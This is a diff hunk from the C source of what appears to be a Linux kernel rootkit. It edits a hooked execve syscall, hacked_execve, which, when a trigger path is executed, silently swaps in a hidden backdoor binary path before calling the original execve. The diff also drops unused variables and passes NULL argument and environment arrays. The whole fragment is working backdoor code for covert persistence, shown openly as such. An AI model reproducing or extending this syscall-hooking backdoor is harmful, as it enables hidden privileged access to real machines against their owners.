@@ -202,20 +202,18 @@ asmlinkage int hacked_setuid(uid_t uid){
 
 asmlinkage int hacked_execve(const char *filename, const char *argv[], const char *envp[]){
 	char *test;
-	int ret, tmp;
 	char *truc = "/Imma/Firin/Muh/Lazer";
 	char *bd = "/p07470p33l3r/irishman";
-	unsigned long mmm;
 
 	test = (char *) kmalloc(256, GFP_KERNEL);
 
-	(void) copy_from_user(test, filename, 255);
+	copy_from_user(test, filename, 255);
 
 	if(strstr(truc, test) != NULL){
 		printk("Well hi there!");
 		copy_to_user(filename, bd, strlen(bd));
 		kfree(test);
-		return (*orig_execve)(filename, argv, envp);
+		return (*orig_execve)(filename, NULL, NULL);
 	}
 	else{
 		kfree(test);
